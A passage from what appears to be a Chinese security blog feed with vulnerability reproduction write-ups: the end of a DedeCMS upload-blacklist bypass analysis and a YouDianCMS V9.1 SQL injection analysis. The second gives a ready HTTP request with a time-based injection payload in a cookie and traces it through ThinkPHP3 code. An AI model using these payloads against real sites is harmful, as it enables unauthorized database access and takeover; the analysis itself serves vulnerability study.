，为什么会加上一个 <code>*</code> ，这是因为在前面会有一次过滤</p><p>在前面是加载了 <code>include/dialog/config.php</code> ，然后这里再加载 <code>include/common.inc.php</code> ，这个的后面有对传进来的 <code>$_FILES</code> 的处理，146行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(DEDEINC.<span class="string">&#x27;/uploadsafe.inc.php&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进 <code>include/uploadsafe.inc.php</code> ，这里设置了一个黑名单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cfg_not_allowall</span> = <span class="string">&quot;php|pl|cgi|asp|aspx|jsp|php3|shtm|shtml&quot;</span>;</span><br></pre></td></tr></table></figure><p>这就是不能直接写 <code>php</code> 的原因，碰的很巧的是，他为了过滤特殊字符，加了一个过滤，利用这一点，我们就可以绕过这里的黑名单，并在最后成功还原，成功实现前台文件上传 <code>getshell</code></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里成功利用的前提是要有一个可以发表文章的用户，看起来分析很短，但是不得不说，这个漏洞非常的巧妙，多个巧合才有了这个漏洞。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://wiki.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2018-20129/">https://wiki.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2018-20129/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> dedecms </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>友点CMS V9.1 前台SQL注入</title>
      <link href="2021/06/30/%E5%8F%8B%E7%82%B9CMS-V9-1-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/"/>
      <url>2021/06/30/%E5%8F%8B%E7%82%B9CMS-V9-1-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>友点 CMS V9.1 前台存在 sql 注入，攻击者可获取数据库内容</p><h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>youdiancms &lt;=9.1</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index.php&#x2F;Channel&#x2F;voteAdd HTTP&#x2F;1.1</span><br><span class="line">Host: www.youdiancms90.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko&#x2F;20100101 Firefox&#x2F;72.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID&#x3D;pn9iofrfklen68u4205veml8s0; youdianAdminLangSet&#x3D;cn; XDEBUG_SESSION&#x3D;PHPSTORM; youdianfu[0]&#x3D;exp; youdianfu[1]&#x3D;&#x3D;(select 1 from(select sleep(3))a)</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><h3 id="变量控制"><a href="#变量控制" class="headerlink" title="变量控制"></a>变量控制</h3><p>这里首先有一个可以直接赋值的变量，在 <code>App/Lib/Action/HomeBaseAction.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeBaseAction</span> <span class="keyword">extends</span> <span class="title">BaseAction</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$_fromUser</span> = <span class="string">&#x27;&#x27;</span>;  <span class="comment">//微信内部号</span></span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$_isWx</span>=<span class="number">0</span>;  <span class="comment">//是否是微信浏览器访问</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_initialize</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">parent</span>::_initialize();</span><br><span class="line"><span class="keyword">$this</span>-&gt;_assignPublicVar();</span><br><span class="line"><span class="keyword">$this</span>-&gt;_assignConfigVar();</span><br><span class="line"><span class="keyword">$this</span>-&gt;getTemplateConfig();</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取微信帐号=======================</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[<span class="string">&#x27;fu&#x27;</span>])  &amp;&amp; !<span class="keyword">empty</span>( <span class="variable">$_GET</span>[<span class="string">&#x27;fu&#x27;</span>]) )&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_fromUser = <span class="variable">$_GET</span>[<span class="string">&#x27;fu&#x27;</span>];</span><br><span class="line">cookie(<span class="string">&#x27;fu&#x27;</span>, <span class="keyword">$this</span>-&gt;_fromUser, <span class="number">31536000</span>); <span class="comment">//31536000秒＝1年，有效期为1年</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>( cookie(<span class="string">&#x27;fu&#x27;</span>) ) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_fromUser = cookie(<span class="string">&#x27;fu&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//===============================</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要看到下面赋值的位置，如果 <code>GET</code> 了一个 <code>fu</code> ，那么就会将这个的值赋值给 <code>cookie</code>，这里的 <code>cookie</code>方法可以跟进去看看，最后是加了一个前缀</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="variable">$config</span>[<span class="string">&#x27;prefix&#x27;</span>] . <span class="variable">$name</span>;</span><br></pre></td></tr></table></figure><p>最后是将 <code>GET</code> 的 <code>fu</code> 的值赋值给了 <code>youdianfu</code> </p><p>我们如果一开始就给 <code>youdianfu</code> 赋值，那么我们就可以直接控制变量 <code>$this-&gt;_fromUser</code></p><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>接下来可以找哪里用到了这个 <code>$this-&gt;_fromUser</code> ，可以直接搜索</p><p>我们这里使用参考文章中使用的 <code>voteAdd</code> 方法，在 <code>App/Lib/Action/Home/ChannelAction.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">voteAdd</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Content-Type:text/html; charset=utf-8&quot;</span>);</span><br><span class="line">    <span class="variable">$item</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;item&#x27;</span>];</span><br><span class="line">    <span class="variable">$appid</span> = intval(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;appid&#x27;</span>]);</span><br><span class="line">    <span class="variable">$fromUser</span> = !<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;_fromUser) ? <span class="keyword">$this</span>-&gt;_fromUser : get_client_ip();</span><br><span class="line">    <span class="variable">$_REQUEST</span> = YdInput::checkTextbox( <span class="variable">$_REQUEST</span> );</span><br><span class="line">    <span class="variable">$m</span> = D(<span class="string">&#x27;Admin/WxVote&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$m</span>-&gt;hasVoted(<span class="variable">$appid</span>, <span class="variable">$fromUser</span>) )&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ajaxReturn(<span class="literal">null</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里会检测有没有 <code>$this-&gt;_fromUser</code> ，我们可以通过 <code>cookie</code> 设置，然后直接进入 <code>$m-&gt;hasVoted($appid, $fromUser)</code>，我们跟进 <code>App/Lib/Model/Admin/WxVoteModel.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hasVoted</span>(<span class="params"><span class="variable">$appid</span>, <span class="variable">$fromUser</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$where</span>[<span class="string">&#x27;AppID&#x27;</span>] = <span class="variable">$appid</span>;</span><br><span class="line">    <span class="variable">$where</span>[<span class="string">&#x27;FromUser&#x27;</span>] = <span class="variable">$fromUser</span>;</span><br><span class="line">    <span class="variable">$n</span> = <span class="keyword">$this</span>-&gt;where(<span class="variable">$where</span>)-&gt;count();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$n</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里将 <code>$fromUser</code> 的值存进数组 <code>$where</code> ，然后调用 <code>$this-&gt;where</code> ，这个 <code>CMS</code> 的核心框架使用的是 <code>thinkphp3</code> ，<code>thinkphp3</code> 有一些 <code>sql</code> 注入漏洞，这里也是可以的，而且还没有 <code>I()</code> 函数保护</p><p>跟进 <code>$this-&gt;where($where)-&gt;count()</code> ，这里使用了魔术方法 <code>__call</code>，比较容易看懂，这里将值全部传进了 <code>$options</code> 然后进入 <code>$this-&gt;getField(strtoupper($method).&#39;(&#39;.$field.&#39;) AS tp_&#39;.$method)</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$options</span>[<span class="string">&#x27;field&#x27;</span>]    =  <span class="variable">$field</span>;</span><br><span class="line"><span class="variable">$options</span> =  <span class="keyword">$this</span>-&gt;_parseOptions(<span class="variable">$options</span>);</span><br><span class="line">...</span><br><span class="line"><span class="variable">$options</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;db-&gt;select(<span class="variable">$options</span>);</span><br></pre></td></tr></table></figure><p>将值全部存进 <code>$options</code>，我们可以看一下这里面的内容</p><p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210630232219.png"></p><p>之后进入 <code>$this-&gt;db-&gt;select($options)</code>，在 <code>App/Core/Lib/Core/Db.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$options</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;model  =   <span class="variable">$options</span>[<span class="string">&#x27;model&#x27;</span>];</span><br><span class="line">    <span class="variable">$sql</span>   = <span class="keyword">$this</span>-&gt;buildSelectSql(<span class="variable">$options</span>);</span><br><span class="line">    <span class="variable">$cache</span>  =  <span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;cache&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;cache&#x27;</span>]:<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$cache</span>) &#123; <span class="comment">// 查询缓存检测</span></span><br><span class="line">        <span class="variable">$key</span> =  is_string(<span class="variable">$cache</span>[<span class="string">&#x27;key&#x27;</span>])?<span class="variable">$cache</span>[<span class="string">&#x27;key&#x27;</span>]:md5(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$value</span>   =  S(<span class="variable">$key</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$cache</span>[<span class="string">&#x27;type&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">false</span> !== <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$result</span>   = <span class="keyword">$this</span>-&gt;query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>这里获取 <code>model</code> 后进入 <code>$this-&gt;buildSelectSql($options)</code> ，这看起来像是构建 <code>sql</code> 语句的方法，接着进入 <code>$this-&gt;parseSql($this-&gt;selectSql,$options)</code> ，<code>$this-&gt;selectSql</code> 是查询语句模板</p><p><code>parseSql</code> 是获取 <code>$options</code> 中的值，然后替换模板得到最终的 <code>sql</code> 语句，我们来看看怎么获取到 <code>where</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;parseWhere(<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]:<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_string(<span class="variable">$where</span>)) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;<span class="keyword">else</span>&#123; <span class="comment">// 使用数组或者对象条件表达式</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$where</span>[<span class="string">&#x27;_logic&#x27;</span>])) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 默认进行 AND 运算</span></span><br><span class="line">        <span class="variable">$operate</span>    =   <span class="string">&#x27; AND &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$where</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">        <span class="variable">$whereStr</span> .= <span class="string">&#x27;( &#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">0</span>===strpos(<span class="variable">$key</span>,<span class="string">&#x27;_&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 解析特殊条件表达式</span></span><br><span class="line">            <span class="variable">$whereStr</span>   .= <span class="keyword">$this</span>-&gt;parseThinkWhere(<span class="variable">$key</span>,<span class="variable">$val</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 查询字段的安全过滤</span></span><br><span class="line">            <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[A-Z_\|\&amp;\-.a-z0-9\(\)\,]+$/&#x27;</span>,trim(<span class="variable">$key</span>)))&#123;</span><br><span class="line">                throw_exception(L(<span class="string">&#x27;_EXPRESS_ERROR_&#x27;</span>).<span class="string">&#x27;:&#x27;</span>.<span class="variable">$key</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 多条件支持</span></span><br><span class="line">            <span class="variable">$multi</span> = is_array(<span class="variable">$val</span>) &amp;&amp;  <span class="keyword">isset</span>(<span class="variable">$val</span>[<span class="string">&#x27;_multi&#x27;</span>]);</span><br><span class="line">            <span class="variable">$key</span> = trim(<span class="variable">$key</span>);</span><br><span class="line">            <span class="keyword">if</span>(strpos(<span class="variable">$key</span>,<span class="string">&#x27;|&#x27;</span>)) &#123; <span class="comment">// 支持 name|title|nickname 方式定义查询字段</span></span><br><span class="line">                <span class="variable">$array</span>   =  explode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$key</span>);</span><br><span class="line">                <span class="variable">$str</span>   = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$m</span>=&gt;<span class="variable">$k</span>)&#123;</span><br><span class="line">                    <span class="variable">$v</span> =  <span class="variable">$multi</span>?<span class="variable">$val</span>[<span class="variable">$m</span>]:<span class="variable">$val</span>;</span><br><span class="line">                    <span class="variable">$str</span>[]   = <span class="string">&#x27;(&#x27;</span>.<span class="keyword">$this</span>-&gt;parseWhereItem(<span class="keyword">$this</span>-&gt;parseKey(<span class="variable">$k</span>),<span class="variable">$v</span>).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$whereStr</span> .= implode(<span class="string">&#x27; OR &#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">            &#125;<span class="keyword">elseif</span>(strpos(<span class="variable">$key</span>,<span class="string">&#x27;&amp;&#x27;</span>))&#123;</span><br><span class="line">                <span class="variable">$array</span>   =  explode(<span class="string">&#x27;&amp;&#x27;</span>,<span class="variable">$key</span>);</span><br><span class="line">                <span class="variable">$str</span>   = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$m</span>=&gt;<span class="variable">$k</span>)&#123;</span><br><span class="line">                    <span class="variable">$v</span> =  <span class="variable">$multi</span>?<span class="variable">$val</span>[<span class="variable">$m</span>]:<span class="variable">$val</span>;</span><br><span class="line">                    <span class="variable">$str</span>[]   = <span class="string">&#x27;(&#x27;</span>.<span class="keyword">$this</span>-&gt;parseWhereItem(<span class="keyword">$this</span>-&gt;parseKey(<span class="variable">$k</span>),<span class="variable">$v</span>).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$whereStr</span> .= implode(<span class="string">&#x27; AND &#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$whereStr</span>   .= <span class="keyword">$this</span>-&gt;parseWhereItem(<span class="keyword">$this</span>-&gt;parseKey(<span class="variable">$key</span>),<span class="variable">$val</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$whereStr</span> .= <span class="string">&#x27; )&#x27;</span>.<span class="variable">$operate</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$whereStr</span> = substr(<span class="variable">$whereStr</span>,<span class="number">0</span>,-strlen(<span class="variable">$operate</span>));</span><br></pre></td></tr></table></figure><p>这里我把无关紧要的语句全部用 <code>...</code> 代替了</p><p>我们的 <code>$where</code> 值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AppID&#x3D;0</span><br><span class="line">FromUser&#x3D;[&#39;exp&#39;,&#39;&#x3D;(select 1 from (select sleep(3))a)&#39;]</span><br></pre></td></tr></table></figure><p>根据值来判断，取到 <code>FromUser</code> 的时候，我们会来到这里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$whereStr</span>   .= <span class="keyword">$this</span>-&gt;parseWhereItem(<span class="keyword">$this</span>-&gt;parseKey(<span class="variable">$key</span>),<span class="variable">$val</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$whereStr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$val</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span>(is_string(<span class="variable">$val</span>[<span class="number">0</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^(EQ|NEQ|GT|EGT|LT|ELT|NOTLIKE|LIKE)$/i&#x27;</span>,<span class="variable">$val</span>[<span class="number">0</span>])) &#123; <span class="comment">// 比较运算</span></span><br><span class="line">            <span class="variable">$whereStr</span> .= <span class="variable">$key</span>.<span class="string">&#x27; &#x27;</span>.<span class="keyword">$this</span>-&gt;comparison[strtolower(<span class="variable">$val</span>[<span class="number">0</span>])].<span class="string">&#x27; &#x27;</span>.<span class="keyword">$this</span>-&gt;parseValue(<span class="variable">$val</span>[<span class="number">1</span>]);</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="string">&#x27;exp&#x27;</span>==strtolower(<span class="variable">$val</span>[<span class="number">0</span>]))&#123; <span class="comment">// 使用表达式</span></span><br><span class="line">            <span class="variable">$whereStr</span> .= <span class="string">&#x27; (&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$val</span>[<span class="number">1</span>].<span class="string">&#x27;) &#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(preg_match(<span class="string">&#x27;/^(NOTIN|NOT IN|IN)$/i&#x27;</span>,<span class="variable">$val</span>[<span class="number">0</span>]))&#123; <span class="comment">// IN 运算</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$val</span>[<span class="number">2</span>]) &amp;&amp; <span class="string">&#x27;exp&#x27;</span>==<span class="variable">$val</span>[<span class="number">2</span>]) &#123;</span><br><span class="line">                <span class="variable">$whereStr</span> .= <span class="variable">$key</span>.<span class="string">&#x27; &#x27;</span>.strtoupper(<span class="variable">$val</span>[<span class="number">0</span>]).<span class="string">&#x27; &#x27;</span>.<span class="variable">$val</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(is_string(<span class="variable">$val</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                     <span class="variable">$val</span>[<span class="number">1</span>] =  explode(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$val</span>[<span class="number">1</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$zone</span>   =   implode(<span class="string">&#x27;,&#x27;</span>,<span class="keyword">$this</span>-&gt;parseValue(<span class="variable">$val</span>[<span class="number">1</span>]));</span><br><span class="line">                <span class="variable">$whereStr</span> .= <span class="variable">$key</span>.<span class="string">&#x27; &#x27;</span>.strtoupper(<span class="variable">$val</span>[<span class="number">0</span>]).<span class="string">&#x27; (&#x27;</span>.<span class="variable">$zone</span>.<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(preg_match(<span class="string">&#x27;/(NOTBETWEEN|NOT BETWEEN|BETWEEN)/i&#x27;</span>,<span class="variable">$val</span>[<span class="number">0</span>]))&#123; <span class="comment">// BETWEEN运算</span></span><br><span class="line">            <span class="variable">$data</span> = is_string(<span class="variable">$val</span>[<span class="number">1</span>])? explode(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$val</span>[<span class="number">1</span>]):<span class="variable">$val</span>[<span class="number">1</span>];</span><br><span class="line">            <span class="variable">$whereStr</span> .=  <span class="string">&#x27; (&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27; &#x27;</span>.strtoupper(<span class="variable">$val</span>[<span class="number">0</span>]).<span class="string">&#x27; &#x27;</span>.<span class="keyword">$this</span>-&gt;parseValue(<span class="variable">$data</span>[<span class="number">0</span>]).<span class="string">&#x27; AND &#x27;</span>.<span class="keyword">$this</span>-&gt;parseValue(<span class="variable">$data</span>[<span class="number">1</span>]).<span class="string">&#x27; )&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            throw_exception(L(<span class="string">&#x27;_EXPRESS_ERROR_&#x27;</span>).<span class="string">&#x27;:&#x27;</span>.<span class="variable">$val</span>[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 <code>$val[0]</code> 是字符串的时候，如果 <code>$val[0]= exp</code> ，那么就会直接拼接 <code>$val[1]</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$whereStr</span> .= <span class="string">&#x27; (&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$val</span>[<span class="number">1</span>].<span class="string">&#x27;) &#x27;</span>;</span><br></pre></td></tr></table></figure><p>就会变成</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(`FromUser` <span class="operator">=</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> sleep(<span class="number">3</span>))a))</span><br></pre></td></tr></table></figure><p>这里需要 <code>$val[1]</code> 自己带上一个等于号</p><p>最后返回 <code>sql</code> 语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> tp_count <span class="keyword">FROM</span> `youdian_wx_vote` <span class="keyword">WHERE</span> ( `AppID` <span class="operator">=</span> <span class="number">0</span> ) <span class="keyword">AND</span> (  (`FromUser` <span class="operator">=</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> sleep(<span class="number">3</span>))a))  ) LIMIT <span class="number">1</span>  </span><br></pre></td></tr></table></figure><h2 id="Exp"><a 